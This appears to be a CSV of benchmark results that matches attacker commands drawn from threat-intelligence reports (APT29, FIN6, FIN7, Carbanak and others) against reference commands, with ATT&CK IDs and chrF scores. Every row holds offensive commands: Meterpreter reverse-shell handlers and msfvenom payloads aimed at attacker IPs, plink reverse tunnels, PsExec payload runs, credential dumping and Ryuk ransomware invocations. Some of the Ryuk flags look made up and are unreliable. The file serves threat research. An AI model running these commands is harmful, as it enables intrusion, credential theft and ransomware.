report,file,tool,input_command,matched_command,chrf_score,match_found
POWER_APT29,command_windows_credential_editor_TA0002_T1059.txt,windows credential editor,wce -s <username>:<domain>:<ntlm_hash>:<password>,"```sh
wce.exe -w
```","5,753",True
POWER_APT29,command_windows_credential_editor_TA0002_T1204.txt,windows credential editor,wce.exe -dump-kerb,"```sh
wce.exe -w
```","37,049",True
RESEARCH_OILRIG,command_psexec_TA0002_T1053.txt,psexec,psexec \\\\<target_computer_name> -nobanner -accepteula -i cmd /c <file_path>\Client update.exe,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","25,834",True
RESEARCH_OILRIG,command_psexec_TA0003_T1053.txt,psexec,"psexec \\<target_system> -nobanner -accepteula -d -i cmd /c ""<path_to_Client_update.exe>""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","24,312",True
RESEARCH_OILRIG,command_psexec_TA0004_T1053.txt,psexec,"psexec \\<remote_system> cmd /c ""Client update.exe""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","17,812",True
RPT1_FIN6,command_adfind_TA0007_T1018.txt,adfind,"adfind -sc sl:msds* -b dc=<domain_name>,dc=net -f ""objectcategory=computer""",`adfind.exe -f (objectcategory=computer) > ad_computers.txt`,"41,215",True
RPT1_FIN6,command_plink_TA0011_T1572.txt,plink,plink -R <listen_ip>:<listen_port>:localhost:<local_port>,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","25,112",True
SEA_APT29,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,Invoke-PSImage -Script .\upx.exe -Out .\evil-upx.png -Image .\kiwi.jpg,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"56,909",True
SEA_APT29,command_plink_TA0011_T1071.txt,plink,plink.exe -R <http_port>:localhost:<http_port> login.example.com,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","31,435",True
SEA_APT29,command_pupy_TA0003_T1546.txt,pupy,pupwinutils/psexec.py -s -i cmd /c powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File <file_path>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"12,293",True
SecurityIntelligence8_FIN6,command_metasploit_TA0002_T1072.txt,metasploit,"msfconsole -x ""use exploit/windows/meterpreter/reverse_tcp; set LHOST 192.168.0.4; set LPORT 3389; set PAYLOAD windows/meterpreter/reverse_tcp; run""","```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
```","40,765",True
SecurityIntelligence8_FIN6,command_metasploit_TA0008_T1072.txt,metasploit,msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=443 -f exe -o <file_name>.exe,`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 -f exe-service -o javamtsup.exe`,"60,117",True
SecurityIntelligence8_FIN6,command_ryuk_TA0003_T1543.txt,ryuk,ryuk.exe /inject <dll_name>,`ryuk.exe --encrypt --process-name notepad.exe`,"29,48",True
SecurityIntelligence8_FIN6,command_wmic_TA0002_T1047.txt,wmic,"wmic /namespace:\\root\cimv2 /class Win32_ComputerSystem Get Username, Domain","`wmic /node:#{""POS system""} process call create #{""executable""}`","17,043",True
SENTINELONE_FIN7,command_adfind_TA0002_T1204.txt,adfind,adfind msDS-ReplConnectionFailures,`adfind.exe -f (objectcategory=organizationalUnit) > ad_ous.txt`,"21,431",True
SENTINELONE_FIN7,command_adfind_TA0007_T1482.txt,adfind,"adfind -b <basedn> -f ""(objectcategory=group)(|!(name=*Domain Group))"" -a dn","adfind -f ""(objectcategory=group)""`","45,681",True
SENTINELONE_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","64,495",True
SENTINELONE_FIN7,command_chrome_passwords_TA0005_T1027.txt,chrome passwords,chrome-passwords -p <local_app_chrome_directory>\User Data\Default\Cookies.db,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","25,753",True
SENTINELONE_FIN7,command_plink_TA0011_T1071.txt,plink,plink.exe -ssh <attacker_ssh_user>@<cdn_domain> -P 443,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","48,477",True
SENTINELONE_FIN7,command_psexec_TA0007_T1057.txt,psexec,psexec \\* -u <username> -p <password> -d cmd /c tasklist,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","21,939",True
SENTINELONE_FIN7,command_ryuk_TA0005_T1497.txt,ryuk,ryuk --check-sandbox <drive_size>,`ryuk.exe --encrypt --process-name notepad.exe`,"13,565",True
SENTINELONE_FIN7,command_ryuk_TA0007_T1497.txt,ryuk,ryuk.exe --check-sandbox,`ryuk.exe --encrypt --process-name notepad.exe`,"36,171",True
SENTINELONE_FIN7,command_wmic_TA0007_T1082.txt,wmic,wmic os get /value,"`wmic /node:#{""POS system""} process call create #{""executable""}`","14,492",True
TALOS_FIN7,command_ryuk_TA0004_T1055.txt,ryuk,ryuk.exe --inject <dll_name>,`ryuk.exe --encrypt --process-name notepad.exe`,"36,043",True
THREATDOWN_OILRIG,command_chrome_passwords_TA0001_T1204.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","60,523",True
THREATDOWN_OILRIG,command_ryuk_TA0011_T1105.txt,ryuk,ryuk.exe --drop-bat-files,`ryuk.exe --encrypt --process-name notepad.exe`,"36,908",True
THREATPOST_CARBANAK,command_chrome_passwords_TA0006_T1555.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","64,495",True
THREATPOST_CARBANAK,command_metasploit_TA0042_T1587.txt,metasploit,set payload windows/meterpreter/reverse_tcp,"```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
```","63,966",True
THREATPOST_CARBANAK,command_plink_TA0011_T1219.txt,plink,plink.exe -i <attacker_ssh_private_key> root@<target_machine_IP> -R 3389:localhost:3389,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","50,97",True
THREATPOST_CARBANAK,command_ryuk_TA0002_T1204.txt,ryuk,ryuk.exe -e --drop-bat-files,`ryuk.exe --encrypt --process-name notepad.exe`,"34,525",True
THREATPOST_CARBANAK,command_ryuk_TA0009_T1113.txt,ryuk,ryuk.exe /capture,`ryuk.exe --encrypt --process-name notepad.exe`,"33,714",True
TRENDMICRO_WIZARDSPIDER,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","64,495",True
TRENDMICRO_WIZARDSPIDER,command_windows_credential_editor_TA0006_T1003.txt,windows credential editor,wce -e,"```sh
wce.exe -w
```","26,71",True
TRUSTWAVE1_CARBANAK,command_pupy_TA0003_T1053.txt,pupy,"pupysh.py --bg schedule_task --type at --minutes <minutes> --command ""tasklist /V""",`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"12,458",True
TRUSTWAVE1_CARBANAK,command_rubeus_TA0005_T1112.txt,rubeus,Rubeus.exe logonsession,`rubeus.exe kerberoast /domain:oz.local`,"34,217",True
TRUSTWAVE1_CARBANAK,command_ryuk_TA0003_T1547.txt,ryuk,ryuk.exe --drop-bat-files,`ryuk.exe --encrypt --process-name notepad.exe`,"36,908",True
TRUSTWAVE2_CARBANAK,command_ryuk_TA0004_T1055.txt,ryuk,ryuk.exe --inject-code-into-process=<target_process_name>,`ryuk.exe --encrypt --process-name notepad.exe`,"33,707",True
TRUSTWAVE3_CARBANAK,command_chrome_passwords_TA0005_T1027.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","60,523",True
TRUSTWAVE3_CARBANAK,command_rubeus_TA0003_T1543.txt,rubeus,rubeus harvest /targetuser:<scheduled_task_user> /interval:10,`rubeus.exe kerberoast /domain:oz.local`,"15,388",True
TRUSTWAVE3_CARBANAK,command_ryuk_TA0004_T1055.txt,ryuk,ryuk.exe --inject <dll_name> --process <target_process>,`ryuk.exe --encrypt --process-name notepad.exe`,"36,963",True
TRUSTWAVE3_CARBANAK,command_ryuk_TA0005_T1055.txt,ryuk,ryuk.exe /inject <dll_name> <process_id>,`ryuk.exe --encrypt --process-name notepad.exe`,"34,094",True
TRUSTWAVE3_CARBANAK,command_ryuk_TA0009_T1022.txt,ryuk,ryuk.exe --encrypt-all <directory_path>,`ryuk.exe --encrypt --process-name notepad.exe`,"47,399",True
TRUSTWAVE3_CARBANAK,command_ryuk_TA0010_T1041.txt,ryuk,ryuk.exe -e,`ryuk.exe --encrypt --process-name notepad.exe`,"47,11",True
UkrainianCriticalInfrastructure_SANDWORM,command_psexec_TA0008_T1021.txt,psexec,psexec.exe -u <user_name> -p <password> -r telnet,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","21,404",True
UkrainianCriticalInfrastructure_SANDWORM,command_ryuk_TA0040_T1529.txt,ryuk,ryuk.exe /shutdown,`ryuk.exe --encrypt --process-name notepad.exe`,"30,861",True
UNIT42_1_OILRIG,command_plink_TA0011_T1071.txt,plink,plink.exe -C -i <private_key_file> -hostkey <host_key_id> <attacker_ssh_user>@<remote_host>,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","36,165",True
UNIT42_1_OILRIG,command_ryuk_TA0003_T1505.txt,ryuk,ryuk.exe -- persistence <persistence_script_path>,`ryuk.exe --encrypt --process-name notepad.exe`,"28,709",True
UNIT42_1_OILRIG,command_windows_credential_editor_TA0006_T1003.txt,windows credential editor,wce -w,"```sh
wce.exe -w
```","33,601",True
VISA_FIN6,command_adfind_TA0007_T1087.txt,adfind,"adfind -f ""(objectcategory=computer)""","adfind -f ""(objectcategory=group)""`","73,395",True
VISA_FIN6,command_metasploit_TA0003_T1505.txt,metasploit,msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.0.1; set LPORT 443; run',"```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
```","52,184",True
VISA_FIN6,command_metasploit_TA0004_T1068.txt,metasploit,msfconsole,`sudo msfconsole`,"85,851",True
VISA_FIN6,command_metasploit_TA0011_T1219.txt,metasploit,meterpreter > shell,`meterpreter > load powershell`,"70,528",True
VISA_FIN6,command_psexec_TA0002_T1106.txt,psexec,"psexec \\remote_system -u domain\username -p password osql.exe -S <SQL_Server_Instance> -Q ""SELECT * FROM database.table""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","24,649",True
VISA_FIN6,command_windows_credential_editor_TA0009_T1213.txt,windows credential editor,windows-credential-editor -w,"```sh
wce.exe -w
```","6,028",True
